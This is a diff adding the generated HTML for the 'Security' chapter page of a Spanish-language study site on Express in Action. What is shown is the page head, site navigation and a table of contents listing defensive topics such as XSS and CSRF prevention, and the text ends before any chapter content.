@@ -1,0 +1,2109 @@
+
+<!doctype html>
+<html lang="en" class="no-js">
+  <head>
+    
+      <meta charset="utf-8">
+      <meta name="viewport" content="width=device-width,initial-scale=1">
+      
+        <meta name="description" content="A new project generated from the default template project.">
+      
+      
+        <meta name="author" content="<Alexander Guerrero>">
+      
+      
+      
+        <link rel="prev" href="../../cap2/TestingExpressApplication/">
+      
+      
+        <link rel="next" href="../../cap4/Deplyment/">
+      
+      
+        
+      
+      
+      <link rel="icon" href="../../../../assets/images/favicon.png">
+      <meta name="generator" content="zensical-0.0.36">
+    
+    
+      
+        <title>Security - Learning Express</title>
+      
+    
+    
+      
+        
+      
+      <link rel="stylesheet" href="../../../../assets/stylesheets/modern/main.1e981d71.min.css">
+      
+        
+          
+        
+        <link rel="stylesheet" href="../../../../assets/stylesheets/modern/palette.dfe2e883.min.css">
+      
+      
+
+
+    
+    
+      
+    
+    
+      
+        
+        
+        <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+        <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Inter:300,300i,400,400i,500,500i,700,700i%7CJetBrains+Mono:400,400i,700,700i&amp;display=fallback">
+        <style>:root{--md-text-font:"Inter";--md-code-font:"JetBrains Mono"}</style>
+      
+    
+    
+    <script>__md_scope=new URL("../../../..",location),__md_hash=e=>[...e].reduce(((e,t)=>(e<<5)-e+t.charCodeAt(0)),0),__md_get=(e,t=localStorage,a=__md_scope)=>JSON.parse(t.getItem(a.pathname+"."+e)),__md_set=(e,t,a=localStorage,_=__md_scope)=>{try{a.setItem(_.pathname+"."+e,JSON.stringify(t))}catch(e){}},document.documentElement.setAttribute("data-platform",navigator.platform)</script>
+    
+      
+
+    
+    
+  </head>
+  
+  
+    
+    
+      
+    
+    
+    
+    
+    <body dir="ltr" data-md-color-scheme="default" data-md-color-primary="indigo" data-md-color-accent="indigo">
+  
+    
+    <input class="md-toggle" data-md-toggle="drawer" type="checkbox" id="__drawer" autocomplete="off">
+    <input class="md-toggle" data-md-toggle="search" type="checkbox" id="__search" autocomplete="off">
+    <label class="md-overlay" for="__drawer" aria-label="Navigation"></label>
+    <div data-md-component="skip">
+      
+        
+        <a href="#security" class="md-skip">
+          Skip to content
+        </a>
+      
+    </div>
+    <div data-md-component="announce">
+      
+    </div>
+    
+    
+      
+
+  
+
+<header class="md-header md-header--shadow" data-md-component="header">
+  <nav class="md-header__inner md-grid" aria-label="Header">
+    <a href="../../../.." title="Learning Express" class="md-header__button md-logo" aria-label="Learning Express" data-md-component="logo">
+      
+  
+  <svg xmlns="http://www.w3.org/2000/svg" fill="none" stroke="currentColor" stroke-linecap="round" stroke-linejoin="round" stroke-width="2" class="lucide lucide-book-open" viewBox="0 0 24 24"><path d="M12 7v14M3 18a1 1 0 0 1-1-1V4a1 1 0 0 1 1-1h5a4 4 0 0 1 4 4 4 4 0 0 1 4-4h5a1 1 0 0 1 1 1v13a1 1 0 0 1-1 1h-6a3 3 0 0 0-3 3 3 3 0 0 0-3-3z"/></svg>
+
+    </a>
+    <label class="md-header__button md-icon" for="__drawer" aria-label="Navigation">
+      
+      <svg xmlns="http://www.w3.org/2000/svg" fill="none" stroke="currentColor" stroke-linecap="round" stroke-linejoin="round" stroke-width="2" class="lucide lucide-menu" viewBox="0 0 24 24"><path d="M4 5h16M4 12h16M4 19h16"/></svg>
+    </label>
+    <div class="md-header__title" data-md-component="header-title">
+      <div class="md-header__ellipsis">
+        <div class="md-header__topic">
+          <span class="md-ellipsis">
+            Learning Express
+          </span>
+        </div>
+        <div class="md-header__topic" data-md-component="header-topic">
+          <span class="md-ellipsis">
+            
+              Security
+            
+          </span>
+        </div>
+      </div>
+    </div>
+    
+      
+        <form class="md-header__option" data-md-component="palette">
+  
+    
+    
+    
+    <input class="md-option" data-md-color-media="none" data-md-color-scheme="default" data-md-color-primary="indigo" data-md-color-accent="indigo"  aria-label="Switch to dark mode"  type="radio" name="__palette" id="__palette_0">
+    
+      <label class="md-header__button md-icon" title="Switch to dark mode" for="__palette_1" hidden>
+        <svg xmlns="http://www.w3.org/2000/svg" fill="none" stroke="currentColor" stroke-linecap="round" stroke-linejoin="round" stroke-width="2" class="lucide lucide-sun" viewBox="0 0 24 24"><circle cx="12" cy="12" r="4"/><path d="M12 2v2M12 20v2M4.93 4.93l1.41 1.41M17.66 17.66l1.41 1.41M2 12h2M20 12h2M6.34 17.66l-1.41 1.41M19.07 4.93l-1.41 1.41"/></svg>
+      </label>
+    
+  
+    
+    
+    
+    <input class="md-option" data-md-color-media="none" data-md-color-scheme="slate" data-md-color-primary="indigo" data-md-color-accent="indigo"  aria-label="Switch to light mode"  type="radio" name="__palette" id="__palette_1">
+    
+      <label class="md-header__button md-icon" title="Switch to light mode" for="__palette_0" hidden>
+        <svg xmlns="http://www.w3.org/2000/svg" fill="none" stroke="currentColor" stroke-linecap="round" stroke-linejoin="round" stroke-width="2" class="lucide lucide-moon" viewBox="0 0 24 24"><path d="M20.985 12.486a9 9 0 1 1-9.473-9.472c.405-.022.617.46.402.803a6 6 0 0 0 8.268 8.268c.344-.215.825-.004.803.401"/></svg>
+      </label>
+    
+  
+</form>
+      
+    
+    
+      <script>var palette=__md_get("__palette");if(palette&&palette.color){if("(prefers-color-scheme)"===palette.color.media){var media=matchMedia("(prefers-color-scheme: light)"),input=document.querySelector(media.matches?"[data-md-color-media='(prefers-color-scheme: light)']":"[data-md-color-media='(prefers-color-scheme: dark)']");palette.color.media=input.getAttribute("data-md-color-media"),palette.color.scheme=input.getAttribute("data-md-color-scheme"),palette.color.primary=input.getAttribute("data-md-color-primary"),palette.color.accent=input.getAttribute("data-md-color-accent")}for(var[key,value]of Object.entries(palette.color))document.body.setAttribute("data-md-color-"+key,value)}</script>
+    
+    
+    
+      
+      
+        <label class="md-header__button md-icon" for="__search" aria-label="Search">
+          
+          <svg xmlns="http://www.w3.org/2000/svg" fill="none" stroke="currentColor" stroke-linecap="round" stroke-linejoin="round" stroke-width="2" class="lucide lucide-search" viewBox="0 0 24 24"><path d="m21 21-4.34-4.34"/><circle cx="11" cy="11" r="8"/></svg>
+        </label>
+        <div class="md-search" data-md-component="search" role="dialog" aria-label="Search">
+  <button type="button" class="md-search__button">
+    Search
+  </button>
+</div>
+      
+    
+    <div class="md-header__source">
+      
+        <a href="https://github.com/alexanderguerrero1998/zensical-express-in-acctions" title="Go to repository" class="md-source" data-md-component="source">
+  <div class="md-source__icon md-icon">
+    
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 448 512"><!--! Font Awesome Free 7.2.0 by @fontawesome - https://fontawesome.com License - https://fontawesome.com/license/free (Icons: CC BY 4.0, Fonts: SIL OFL 1.1, Code: MIT License) Copyright 2026 Fonticons, Inc.--><path fill="currentColor" d="M439.6 236.1 244 40.5c-5.4-5.5-12.8-8.5-20.4-8.5s-15 3-20.4 8.4L162.5 81l51.5 51.5c27.1-9.1 52.7 16.8 43.4 43.7l49.7 49.7c34.2-11.8 61.2 31 35.5 56.7-26.5 26.5-70.2-2.9-56-37.3L240.3 199v121.9c25.3 12.5 22.3 41.8 9.1 55-6.4 6.4-15.2 10.1-24.3 10.1s-17.8-3.6-24.3-10.1c-17.6-17.6-11.1-46.9 11.2-56v-123c-20.8-8.5-24.6-30.7-18.6-45L142.6 101 8.5 235.1C3 240.6 0 247.9 0 255.5s3 15 8.5 20.4l195.6 195.7c5.4 5.4 12.7 8.4 20.4 8.4s15-3 20.4-8.4l194.7-194.7c5.4-5.4 8.4-12.8 8.4-20.4s-3-15-8.4-20.4"/></svg>
+  </div>
+  <div class="md-source__repository">
+    zensical-express-in-acctions
+  </div>
+</a>
+      
+    </div>
+  </nav>
+  
+</header>
+    
+    <div class="md-container" data-md-component="container">
+      
+      
+        
+          
+        
+      
+      <main class="md-main" data-md-component="main">
+        <div class="md-main__inner md-grid">
+          
+            
+              
+              <div class="md-sidebar md-sidebar--primary" data-md-component="sidebar" data-md-type="navigation" >
+                <div class="md-sidebar__scrollwrap">
+                  <div class="md-sidebar__inner">
+                    
+
+
+
+<nav class="md-nav md-nav--primary" aria-label="Navigation" data-md-level="0">
+  <label class="md-nav__title" for="__drawer">
+    <a href="../../../.." title="Learning Express" class="md-nav__button md-logo" aria-label="Learning Express" data-md-component="logo">
+      
+  
+  <svg xmlns="http://www.w3.org/2000/svg" fill="none" stroke="currentColor" stroke-linecap="round" stroke-linejoin="round" stroke-width="2" class="lucide lucide-book-open" viewBox="0 0 24 24"><path d="M12 7v14M3 18a1 1 0 0 1-1-1V4a1 1 0 0 1 1-1h5a4 4 0 0 1 4 4 4 4 0 0 1 4-4h5a1 1 0 0 1 1 1v13a1 1 0 0 1-1 1h-6a3 3 0 0 0-3 3 3 3 0 0 0-3-3z"/></svg>
+
+    </a>
+    Learning Express
+  </label>
+  
+    <div class="md-nav__source">
+      <a href="https://github.com/alexanderguerrero1998/zensical-express-in-acctions" title="Go to repository" class="md-source" data-md-component="source">
+  <div class="md-source__icon md-icon">
+    
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 448 512"><!--! Font Awesome Free 7.2.0 by @fontawesome - https://fontawesome.com License - https://fontawesome.com/license/free (Icons: CC BY 4.0, Fonts: SIL OFL 1.1, Code: MIT License) Copyright 2026 Fonticons, Inc.--><path fill="currentColor" d="M439.6 236.1 244 40.5c-5.4-5.5-12.8-8.5-20.4-8.5s-15 3-20.4 8.4L162.5 81l51.5 51.5c27.1-9.1 52.7 16.8 43.4 43.7l49.7 49.7c34.2-11.8 61.2 31 35.5 56.7-26.5 26.5-70.2-2.9-56-37.3L240.3 199v121.9c25.3 12.5 22.3 41.8 9.1 55-6.4 6.4-15.2 10.1-24.3 10.1s-17.8-3.6-24.3-10.1c-17.6-17.6-11.1-46.9 11.2-56v-123c-20.8-8.5-24.6-30.7-18.6-45L142.6 101 8.5 235.1C3 240.6 0 247.9 0 255.5s3 15 8.5 20.4l195.6 195.7c5.4 5.4 12.7 8.4 20.4 8.4s15-3 20.4-8.4l194.7-194.7c5.4-5.4 8.4-12.8 8.4-20.4s-3-15-8.4-20.4"/></svg>
+  </div>
+  <div class="md-source__repository">
+    zensical-express-in-acctions
+  </div>
+</a>
+    </div>
+  
+  <ul class="md-nav__list" data-md-scrollfix>
+    
+      
+      
+  
+  
+    
+  
+  
+  
+    
+    
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+    
+    
+    
+      
+        
+        
+      
+    
+    
+    <li class="md-nav__item md-nav__item--active md-nav__item--section md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_1" checked>
+        
+          
+          <label class="md-nav__link" for="__nav_1" id="__nav_1_label" tabindex="">
+            
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    EXPRESS IN ACTION
+  
+
+    
+  </span>
+  
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_1_label" aria-expanded="true">
+          <label class="md-nav__title" for="__nav_1">
+            <span class="md-nav__icon md-icon"></span>
+            
+  
+    EXPRESS IN ACTION
+  
+
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../part1/cap1/Intro/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    WHAT IS EXPRESS
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../part1/cap2/ThebasicsofNode.js/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    THE BASICS OF NODE.JS
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../part1/cap3/FoundationsofExpress/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    FOUNDATIONS OF EXPRESS
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../part2/cap1/middleware/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    MIDDLEWARE
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../part2/cap2/Routing/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    ROUTING
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../part2/cap3/buldingApi/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    BUILDING APIS
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../part2/cap4/ViewAndTemplates/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    VIEWS AND TEMPLATES
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../cap0/ExpressInContext/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    EXPRESS IN CONTEXT
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../cap1/persistingDataMongoDb/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    PERSISTING YOUR DATA WITH MONGODB
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../cap2/TestingExpressApplication/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    TESTING EXPRESS APPLICATION
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+    
+  
+  
+  
+    <li class="md-nav__item md-nav__item--active">
+      
+      
+      
+      
+        
+      
+      
+        <label class="md-nav__link md-nav__link--active" for="__toc">
+          
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    SECURITY
+  
+
+    
+  </span>
+  
+  
+
+          <span class="md-nav__icon md-icon"></span>
+        </label>
+      
+      <a href="././" class="md-nav__link md-nav__link--active">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    SECURITY
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+      
+        
+
+
+<nav class="md-nav md-nav--secondary" aria-label="On this page">
+  
+  
+  
+    
+  
+  
+    <label class="md-nav__title" for="__toc">
+      <span class="md-nav__icon md-icon"></span>
+      On this page
+    </label>
+    <ul class="md-nav__list" data-md-component="toc" data-md-scrollfix>
+      
+        <li class="md-nav__item">
+  <a href="#la-mentalidad-de-seguridad" class="md-nav__link">
+    <span class="md-ellipsis">
+      <span class="md-typeset">
+        La mentalidad de seguridad
+      </span>
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#mantener-tu-codigo-lo-mas-libre-de-errores-posible" class="md-nav__link">
+    <span class="md-ellipsis">
+      <span class="md-typeset">
+        Mantener tu código lo más libre de errores posible.
+      </span>
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="Mantener tu código lo más libre de errores posible.">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#imponer-buenas-practicas-de-javascript-con-jshint" class="md-nav__link">
+    <span class="md-ellipsis">
+      <span class="md-typeset">
+        Imponer buenas prácticas de JavaScript con JSHint
+      </span>
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#detener-el-flujo-de-ejecucion-cuando-ocurren-errores-en-los-callbacks" class="md-nav__link">
+    <span class="md-ellipsis">
+      <span class="md-typeset">
+        Detener el flujo de ejecución cuando ocurren errores en los callbacks
+      </span>
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#perilous-parsing-of-query-strings" class="md-nav__link">
+    <span class="md-ellipsis">
+      <span class="md-typeset">
+        Perilous parsing of query strings
+      </span>
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#protegiendo-a-tus-usuarios" class="md-nav__link">
+    <span class="md-ellipsis">
+      <span class="md-typeset">
+        Protegiendo a tus usuarios
+      </span>
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="Protegiendo a tus usuarios">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#usando-https" class="md-nav__link">
+    <span class="md-ellipsis">
+      <span class="md-typeset">
+        Usando HTTPS
+      </span>
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#prevencion-de-ataques-de-secuencias-de-comandos-entre-sitios" class="md-nav__link">
+    <span class="md-ellipsis">
+      <span class="md-typeset">
+        Prevención de ataques de secuencias de comandos entre sitios
+      </span>
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#cross-site-request-forgery-csrf-prevention" class="md-nav__link">
+    <span class="md-ellipsis">
+      <span class="md-typeset">
+        Cross-site request forgery (CSRF) prevention
+      </span>
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#mantener-tus-dependencias-seguras" class="md-nav__link">
+    <span class="md-ellipsis">
+      <span class="md-typeset">
+        Mantener tus dependencias seguras
+      </span>
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="Mantener tus dependencias seguras">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#auditar-el-codigo" class="md-nav__link">
+    <span class="md-ellipsis">
+      <span class="md-typeset">
+        Auditar el código
+      </span>
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#keeping-your-dependencies-up-to-date" class="md-nav__link">
+    <span class="md-ellipsis">
+      <span class="md-typeset">
+        Keeping your dependencies up to date
+      </span>
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#consultalo-en-el-node-security-project" class="md-nav__link">
+    <span class="md-ellipsis">
+      <span class="md-typeset">
+        Consúltalo en el Node Security Project
+      </span>
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#manejo-de-fallos-del-servidor" class="md-nav__link">
+    <span class="md-ellipsis">
+      <span class="md-typeset">
+        Manejo de fallos del servidor
+      </span>
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#varios-pequenos-trucos" class="md-nav__link">
+    <span class="md-ellipsis">
+      <span class="md-typeset">
+        Varios pequeños trucos
+      </span>
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="Varios pequeños trucos">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#sin-express-aqui" class="md-nav__link">
+    <span class="md-ellipsis">
+      <span class="md-typeset">
+        Sin Express aquí
+      </span>
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#previniendo-clickjacking" class="md-nav__link">
+    <span class="md-ellipsis">
+      <span class="md-typeset">
+        Previniendo clickjacking
+      </span>
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#manteniendo-los-productos-adobe-fuera-de-tu-sitio" class="md-nav__link">
+    <span class="md-ellipsis">
+      <span class="md-typeset">
+        Manteniendo los productos Adobe fuera de tu sitio
+      </span>
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#no-permitas-que-los-navegadores-infieran-el-tipo-de-archivo" class="md-nav__link">
+    <span class="md-ellipsis">
+      <span class="md-typeset">
+        No permitas que los navegadores infieran el tipo de archivo
+      </span>
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#summary" class="md-nav__link">
+    <span class="md-ellipsis">
+      <span class="md-typeset">
+        Summary
+      </span>
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#otro-tema-herramientas-de-calidad-de-codigo-por-tipo-de-archivo-en-proyectos-web" class="md-nav__link">
+    <span class="md-ellipsis">
+      <span class="md-typeset">
+        Otro tema - Herramientas de calidad de código por tipo de archivo en proyectos web
+      </span>
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="Otro tema - Herramientas de calidad de código por tipo de archivo en proyectos web">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#resumen-ejecutivo-integrado" class="md-nav__link">
+    <span class="md-ellipsis">
+      <span class="md-typeset">
+        Resumen ejecutivo (integrado)
+      </span>
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="Resumen ejecutivo (integrado)">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#lectura-profesional-del-sistema" class="md-nav__link">
+    <span class="md-ellipsis">
+      <span class="md-typeset">
+        Lectura profesional del sistema
+      </span>
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+    </ul>
+  
+</nav>
+      
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../cap4/Deplyment/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    DEPLOYMENT
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../cap5/bestPractices/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    BEST PRACTICES
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    
+    
+      
+        
+      
+    
+    
+    
+      
+        
+        
+      
+    
+    
+    <li class="md-nav__item md-nav__item--section md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_2" >
+        
+          
+          <label class="md-nav__link" for="__nav_2" id="__nav_2_label" tabindex="">
+            
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    REMPAZA AQUI OTRO LIBRO
+  
+
+    
+  </span>
+  
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_2_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_2">
+            <span class="md-nav__icon md-icon"></span>
+            
+  
+    REMPAZA AQUI OTRO LIBRO
+  
+
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../../Efficient_NodeJS/cap1/nodeFunfamentals.md" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    NODE FUNDAMENTALS
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+    
+  </ul>
+</nav>
+                  </div>
+                </div>
+              </div>
+            
+            
+              
+              <div class="md-sidebar md-sidebar--secondary" data-md-component="sidebar" data-md-type="toc" >
+                <div class="md-sidebar__scrollwrap">
+                  
+                    
+                    
+                    
+                      
+                    
+                    
+                      <input class="md-nav__toggle md-toggle" type="checkbox" id="__toc">
+                      <div class="md-sidebar-button__wrapper">
+                        <label class="md-sidebar-button" for="__toc"></label>
+                      </div>
+                    
+                  
+                  <div class="md-sidebar__inner">
+                    
+
+
+<nav class="md-nav md-nav--secondary" aria-label="On this page">
+  
+  
+  
+    
+  
+  
+    <label class="md-nav__title" for="__toc">
+      <span class="md-nav__icon md-icon"></span>
+      On this page
+    </label>
+    <ul class="md-nav__list" data-md-component="toc" data-md-scrollfix>
+      
+        <li class="md-nav__item">
+  <a href="#la-mentalidad-de-seguridad" class="md-nav__link">
+    <span class="md-ellipsis">
+      <span class="md-typeset">
+        La mentalidad de seguridad
+      </span>
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#mantener-tu-codigo-lo-mas-libre-de-errores-posible" class="md-nav__link">
+    <span class="md-ellipsis">
+      <span class="md-typeset">
+        Mantener tu código lo más libre de errores posible.
+      </span>
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="Mantener tu código lo más libre de errores posible.">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#imponer-buenas-practicas-de-javascript-con-jshint" class="md-nav__link">
+    <span class="md-ellipsis">
+      <span class="md-typeset">
+        Imponer buenas prácticas de JavaScript con JSHint
+      </span>
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#detener-el-flujo-de-ejecucion-cuando-ocurren-errores-en-los-callbacks" class="md-nav__link">
+    <span class="md-ellipsis">
+      <span class="md-typeset">
+        Detener el flujo de ejecución cuando ocurren errores en los callbacks
+      </span>
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#perilous-parsing-of-query-strings" class="md-nav__link">
+    <span class="md-ellipsis">
+      <span class="md-typeset">
+        Perilous parsing of query strings
+      </span>
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#protegiendo-a-tus-usuarios" class="md-nav__link">
+    <span class="md-ellipsis">
+      <span class="md-typeset">
+        Protegiendo a tus usuarios
+      </span>
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="Protegiendo a tus usuarios">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#usando-https" class="md-nav__link">
+    <span class="md-ellipsis">
+      <span class="md-typeset">
+        Usando HTTPS
+      </span>
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#prevencion-de-ataques-de-secuencias-de-comandos-entre-sitios" class="md-nav__link">
+    <span class="md-ellipsis">
+      <span class="md-typeset">
+        Prevención de ataques de secuencias de comandos entre sitios
+      </span>
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#cross-site-request-forgery-csrf-prevention" class="md-nav__link">
+    <span class="md-ellipsis">
+      <span class="md-typeset">
+        Cross-site request forgery (CSRF) prevention
+      </span>
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#mantener-tus-dependencias-seguras" class="md-nav__link">
+    <span class="md-ellipsis">
+      <span class="md-typeset">
+        Mantener tus dependencias seguras
+      </span>
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="Mantener tus dependencias seguras">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#auditar-el-codigo" class="md-nav__link">
+    <span class="md-ellipsis">
+      <span class="md-typeset">
+        Auditar el código
+      </span>
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#keeping-your-dependencies-up-to-date" class="md-nav__link">
+    <span class="md-ellipsis">
+      <span class="md-typeset">
+        Keeping your dependencies up to date
+      </span>
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#consultalo-en-el-node-security-project" class="md-nav__link">
+    <span class="md-ellipsis">
+      <span class="md-typeset">
+        Consúltalo en el Node Security Project
+      </span>
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#manejo-de-fallos-del-servidor" class="md-nav__link">
+    <span class="md-ellipsis">
+      <span class="md-typeset">
+        Manejo de fallos del servidor
+      </span>
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#varios-pequenos-trucos" class="md-nav__link">
+    <span class="md-ellipsis">
+      <span class="md-typeset">
+        Varios pequeños trucos
+      </span>
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="Varios pequeños trucos">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#sin-express-aqui" class="md-nav__link">
+    <span class="md-ellipsis">
+      <span class="md-typeset">
+        Sin Express aquí
+      </span>
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#previniendo-clickjacking" class="md-nav__link">
+    <span class="md-ellipsis">
+      <span class="md-typeset">
+        Previniendo clickjacking
+      </span>
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#manteniendo-los-productos-adobe-fuera-de-tu-sitio" class="md-nav__link">
+    <span class="md-ellipsis">
+      <span class="md-typeset">
+        Manteniendo los productos Adobe fuera de tu sitio
+      </span>
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#no-permitas-que-los-navegadores-infieran-el-tipo-de-archivo" class="md-nav__link">
+    <span class="md-ellipsis">
+      <span class="md-typeset">
+        No permitas que los navegadores infieran el tipo de archivo
+      </span>
+    </span>
+  </a>
+  
+</li>
+        
